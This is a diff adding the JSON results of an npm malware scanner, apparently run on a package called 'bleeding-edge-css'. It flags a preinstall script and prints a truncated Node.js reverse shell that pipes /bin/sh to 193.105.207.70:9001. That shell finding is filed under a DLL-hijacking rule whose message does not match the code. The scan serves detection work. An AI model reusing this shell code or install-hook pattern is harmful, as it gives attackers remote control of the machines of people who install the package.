@@ -1,0 +1,28 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "npm-exec-base64": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:12",
+                "code": "    \"preinstall\":\"node index.js\"\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-serialize-environment": {},
+        "npm-silent-process-execution": {},
+        "npm-dll-hijacking": [
+            {
+                "location": "package/index.js:1",
+                "code": "(function(){\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"/bin/sh\", []);\n    var client = new net.Socket();\n    client.connect(9001, \"193.105.207.70\", function(){\n        client.pipe(sh.stdin);...ing\n})();\n",
+                "message": "This package manipulates a trusted application into loading a malicious DLL"
+            }
+        ],
+        "npm-steganography": {},
+        "npm-obfuscation": {},
+        "shady-links": {},
+        "npm-exfiltrate-sensitive-data": {}
+    },
+    "path": "./dataset/npm/bleeding-edge-css-1.2.2"
+}
